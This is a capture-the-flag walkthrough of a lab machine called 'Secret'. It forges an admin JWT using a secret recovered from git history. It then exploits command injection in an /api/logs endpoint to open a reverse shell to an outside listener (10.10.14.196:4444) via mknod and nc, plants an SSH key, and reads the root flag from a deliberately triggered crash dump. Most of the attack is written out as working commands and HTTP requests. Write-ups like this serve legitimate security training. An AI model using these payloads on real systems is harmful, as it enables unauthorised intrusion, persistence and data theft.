# SECRET
### User Flag

```bash
┌──(kali@kali)-[~]
└─$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.120
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
```

We can fuzz the page but there is really nothing interesting.
First thing to do is download the source code on the main page and then follow the tutorial to create an account with burp for example.

```
POST /api/user/register HTTP/1.1
Accept: application/json
Content-Type: application/json
Content-Length: 85

{
	"name": "Dasor_",
	"email": "testmail@mail.com",
	"password": "testtest"
  }
```

```
POST /api/user/login HTTP/1.1
Accept: application/json
Content-Type: application/json
Content-Length: 85

{
	"email": "testmail@mail.com",
	"password": "testtest"
  }
```

And we get our JWT token althought it is pretty useless since when we connect to /api/priv we just get a message saying that we are normal users.
If we take a look at the source code in /routes/private.js we see that to be admin the our name must be 'theadmin'. So we need to fake our JWT token but we need the secret. If we take a look at the git commits

```bash
┌──(kali@kali)-[~/Machines/Secret/local-web]
└─$ git log --oneline     
e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit

┌──(kali㉿kali)-[~/Machines/Secret/local-web]
└─$ git checkout de0a46b .
Updated 2 paths from aac28c4
```

if we take a look at the old .env we'll find the secret so we can create a JWT token with name 'theadmin' at jwt.io . Now the page says we are admin but we cannot do anything. let's try accesing /api/logs since we saw that on the file previously mentioned private.js (remember to come back to the lastest commit)

```java
if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
```

We can exploit the exec function and create a reverse shell like this (nc -e doesn't work on this machine)

```bash
┌──(kali@kali)-[~/Machines/Secret]
└─$ nc -lnvvvp 4444                                             
listening on [any] 4444 ...
```

```
GET /api/logs?file=;mknod%20/tmp/backpipe%20p;%20/usr/bin/bash%200</tmp/backpipe%20|%20nc%2010.10.14.196%204444%201>%20/tmp/backpipe
Host: 10.10.11.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
auth-token:your admin token
Cache-Control: max-age=0
Content-Length: 4
```

Now we are in let's get the user flag

```bash
connect to [10.10.14.196] from (UNKNOWN) [10.10.11.120] 33178
python3 -c 'import pty; pty.spawn("/bin/bash")'
dasith@secret:~/local-web$ cat /home/dasith/user.txt
```

### Root flag

(We can add our own ssh key to make the work flow easier)

```bash
dasith@secret:~/local-web$ cd /home/dasith/.ssh
dasith@secret:~/local-web$ echo 'yourkey' >> authorized_keys
```

Now if we search in /opt we find a program called count that gives us some information about **any** file or directory. If we look at the code in code.c we can see that if the program crashes it will send a report to /var/crash (default route) so lets do a little trick

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps -aux | grep count
root         827  0.0  0.1 235668  7404 ?        Ssl  20:16   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1688  0.0  0.0   2488   592 pts/3    T    20:20   0:00 ./count
dasith      1691  0.0  0.0   6432   668 pts/3    S+   20:21   0:00 grep --color=auto count

dasith@secret:/opt$ kill -11 1688
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```

So we have now created a crash report, we can make it "readble" (it is a binary) by using

```bash
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
```
And lasty search for the flag in the CoreDump Binary file in /tmp/crash-report
